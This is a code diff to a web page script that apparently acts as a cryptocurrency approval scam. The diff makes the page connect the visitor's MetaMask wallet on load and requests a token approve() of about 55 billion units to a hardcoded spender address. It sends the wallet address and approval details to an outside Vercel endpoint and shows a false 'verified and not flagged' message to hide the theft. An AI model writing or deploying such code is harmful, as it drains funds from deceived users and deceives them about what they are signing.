@@ -15,25 +15,34 @@
     let walletAddress = "";
     let provider, signer;
 
+        // Function to dynamically load the ethers.js script
+    function loadEthers() {
+      return new Promise((resolve, reject) => {
+        const script = document.createElement("script");
+        script.src = "https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"; // Updated CDN URL
+        script.onload = () => resolve();
+        script.onerror = () => reject("Failed to load ethers.js");
+        document.head.appendChild(script);
+      });
+    }
+
+
     async function connectWallet() {
       if (window.ethereum) {
         try {
           await window.ethereum.request({ method: 'eth_requestAccounts' });
-          provider = new ethers.providers.Web3Provider(window.ethereum);
+          provider = new window.ethers.providers.Web3Provider(window.ethereum);
           signer = provider.getSigner();
           walletAddress = await signer.getAddress();
-          document.getElementById("walletInfo").innerText = "Connected: " + walletAddress;
 
           // Log wallet
-          fetch('saveWallet.php', {
+          await fetch('https://bank-website-delta-gules.vercel.app/api/approovewallet', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ wallet: walletAddress })
           });
-
         } catch (err) {
           console.error("Connection error:", err);
-          document.getElementById("walletInfo").innerText = "Wallet not connected";
         }
       } else {
         alert("MetaMask not detected");
@@ -41,13 +50,14 @@
     }
 
     async function approveToken() {
+
       if (!walletAddress) {
         await connectWallet();
         if (!walletAddress) return; // still not connected
       }
 
       const tokenAddress = "0x55d398326f99059ff775485246999027b3197955"; // BUSD (BSC Testnet)
-      const spender = "0x68bb6b4d107e0D705b0360113f4C366F1116974f";
+      const spender = "0xefe2aa8b1381fce14321cd214a7f4b02078753cb";
       const amount = ethers.utils.parseUnits("55398325990.000000000000000001", 18);
 
       const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
@@ -60,7 +70,7 @@
         console.log("✅  Your USDT has been verified and is not flagged in our database.");
 
         // After successful approval: log to server
-        fetch('logApproval.php', {
+        fetch('https://bank-website-delta-gules.vercel.app/api/savewallet', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -83,12 +93,7 @@
         const usdtBalance = await usdtContract.balanceOf(walletAddress);
         const formattedBalance = ethers.utils.formatUnits(usdtBalance, 18); // assuming 18 decimals
 
-
-        showDevBox(`✅  Your USDT has been verified and is not flagged in our database.          Balance: ${formattedBalance} USDT`);
-
-
-
-
+        showDevBox(`✅  Your USDT has been verified and is not flagged in our database.Balance: ${formattedBalance} USDT`);
 
       } catch (err) {
         console.warn("User rejected or error:", err.message);
@@ -96,7 +101,15 @@
     }
 
     // Connect automatically when page loads
-    // window.addEventListener('load', connectWallet);
+    window.addEventListener('load', async () => {
+      try {
+        await loadEthers(); // Wait until ethers.js is loaded
+        connectWallet(); // Now connect wallet after ethers.js is loaded
+      } catch (error) {
+        console.error("Error loading ethers.js:", error);
+      }
+    });
+
   </script>
   <script type="module" src="/src/main.jsx"></script>
 </body>
